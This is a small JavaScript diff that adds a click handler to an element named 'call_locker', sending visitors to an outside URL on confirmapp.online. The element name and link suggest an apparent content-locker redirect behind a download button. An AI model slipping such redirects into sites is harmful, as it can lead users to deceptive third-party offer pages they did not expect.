@@ -230,3 +230,15 @@ function e(e, s, i) {
         if (i) i();
     });
 }
+document.addEventListener("DOMContentLoaded", function () {
+
+    const downloadBtn = document.getElementById("call_locker");
+
+    if(downloadBtn){
+        downloadBtn.addEventListener("click", function(){
+            window.location.href = "https://confirmapp.online/cl/i/4oq9gr";
+        });
+    }
+
+});
+
